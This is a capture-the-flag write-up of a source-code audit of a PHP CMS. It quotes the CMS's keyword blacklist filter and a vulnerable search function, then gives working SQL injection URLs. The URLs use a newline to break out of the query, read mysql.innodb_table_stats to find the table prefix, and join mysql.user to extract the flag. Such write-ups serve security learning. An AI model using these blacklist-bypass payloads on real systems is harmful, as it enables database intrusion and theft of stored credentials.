This chanllage is a typical CMS source code audit.

Accordind to source code, flag is in ``{table_prefix}flag.{blind_column}4``, but ``{table_prefix}`` and ``{blind_column}`` is unknown.

This cms don't use pre-compiled technology, but use addslash and blacklist as below.

```php
<?php 
    if(!defined('simple_cms')) exit();

    $method = $_SERVER['REQUEST_METHOD'];

    if($method !== 'GET' && $method !== 'POST'){
            exit('are you hacker?');
    }

    $filter_str = array('or', 'and', 'information', 'schema', 'procedure', 'analyse', 'order', 'by', 'group', 'into');

    function escape_str($array)
    {
        if(is_array($array)) {
            foreach($array as $key => $value) {
                if(is_array($value)) {
                    $array[$key] = escape_str($value);
                } else {
                    $array[$key] = filter($value);
                }
            }
        } 
        else {
            $array = filter($array);
        }
        return $array;
    }
    function filter($str){
        global $filter_str;

        foreach ($filter_str as $value) {
            if(stripos($str, $value) !== false){
                die('are you hacker?');
            }
        }
        return addslashes($str);
    }

    $_GET = escape_str($_GET);
    $_POST = escape_str($_POST);
    $_COOKIE = escape_str($_COOKIE);
    $_REQUEST = escape_str($_REQUEST);  
?>
```

After looking at source code, I found the following code is weird, seems we can inject via ``search``.

```php
function action_search(){
    $column = Context::get('col');
    $search = Context::get('search');
    $type = strtolower(Context::get('type'));
    $operator = 'or';
    
    if($type === '1'){
        $operator = 'or';
    }
    else if($type === '2'){
        $operator = 'and';
    }
    if(preg_match('/[\<\>\'\"\\\'\\\"\%\=\(\)\/\^\*\-`;,.@0-9\s!\?\[\]\+_&$]/is', $column)){
        $column = 'title';
    }
    $query = get_search_query($column, $search, $operator);
    $result = DB::fetch_multi_row('board', '', '', '0, 10','date desc', $query);
    include(CMS_SKIN_PATH . 'board.php');
}
```

In this code, ``\n`` will trigger a syntax error.

```
http://13.125.3.183/index.php?act=board&mid=search&col=title%23&type=1&search=test%0a)%23
```

Then we try to use ``mysql`` db to get ``{table_prefix}``.

```
http://13.125.3.183/index.php?act=board&mid=search&col=title%23&type=1&search=test%0a)%3C0%20union%20select%201,(select%20table_name%20from%20mysql.innodb_table_stats%20limit%202,1),3,4,5%23
```

At last, we can use ``join`` to get flag.

```
http://13.125.3.183/index.php?act=board&mid=search&col=title%23&type=1&search=test%0A)%3C0%20union%20(select%201,t.*%20from%20mysql.user%20join%2041786c497656426a6149_flag%20t)%23
```